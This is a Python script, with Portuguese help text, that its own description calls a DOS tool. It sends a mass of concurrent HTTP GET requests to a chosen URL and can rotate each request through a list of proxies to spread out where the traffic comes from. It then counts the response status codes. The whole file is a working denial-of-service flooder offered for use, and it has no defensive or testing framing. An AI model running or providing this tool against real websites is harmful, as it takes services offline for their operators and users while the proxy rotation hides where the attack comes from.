import aiohttp
import asyncio
from itertools import cycle
from proxies import proxie_list
import argparse


class Didi50:
    def __init__(self, url, qtd_requests, proxy_mode):
        self.url = url
        self.qtd_requests = qtd_requests
        self.proxy_mode = proxy_mode
        self.saida_2xx = 0
        self.saida_4xx = 0
        self.saida_5xx = 0
        self.saida_demais = 0

    async def fetch(self, session, url_test, proxy):
        try:
            if self.proxy_mode:
                async with session.get(url=url_test, proxy=proxy) as response:
                    print(f"Requisição com proxy {proxy}, na URL: {url_test}: {response.status}")
            else:
                async with session.get(url=url_test) as response:
                    print(f"Requisição usando IP local, na URL: {url_test}: {response.status}")
        except Exception as e:
            print(f"Erro com proxy {proxy}: {e}")
            return
        if str(response.status).startswith('2'):
            self.saida_2xx += 1
        elif str(response.status).startswith('4'):
            self.saida_4xx += 1
        elif str(response.status).startswith('5'):
            self.saida_5xx += 1
        else:
            self.saida_demais += 1

    async def fetch_all(self):
        proxies = proxie_list.proxies
        proxy_pool = cycle(proxies)
        async with aiohttp.ClientSession() as session:
            tasks = []
            for _ in range(self.qtd_requests):
                proxy = next(proxy_pool)
                tasks.append(self.fetch(session=session, url_test=self.url, proxy=proxy))
            await asyncio.gather(*tasks)

    def run(self):
        asyncio.run(self.fetch_all())
        max_length = 30
        print('*' * max_length)
        print(f"*  Num of requests {self.qtd_requests:<{max_length - 20}}|")
        print(f"*  2xx = {self.saida_2xx:<{max_length - 10}}|")
        print(f"*  4xx = {self.saida_4xx:<{max_length - 10}}|")
        print(f"*  5xx = {self.saida_5xx:<{max_length - 10}}|")
        print(f"*  Others = {self.saida_demais:<{max_length - 13}}|")
        print('*' * max_length)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Enviar quantidade massiva de requests")
    parser.add_argument('-u', '--url', type=str, required=True, help="URL do DOS (ex: "
                                                                     "https://www.didi50.com/dos)")
    parser.add_argument('-q', '--qtd_requests', type=int, required=True, help="Quantidade de "
                                                                              "requests enviadas (ex: 1000, 50000. OBS:"
                                                                              "Evite numeros estratosféricos)")
    parser.add_argument('-p', '--proxies', action="store_true", help="Ativa o uso de proxies por request (isso faz com "
                                                                     "que cada request seja feita de um server "
                                                                     "diferente,"
                                                                     " porem existem muito mais chance de falhar a "
                                                                     "request)")

    args = parser.parse_args()
    didi50 = Didi50(args.url, args.qtd_requests, args.proxies)
    didi50.run()
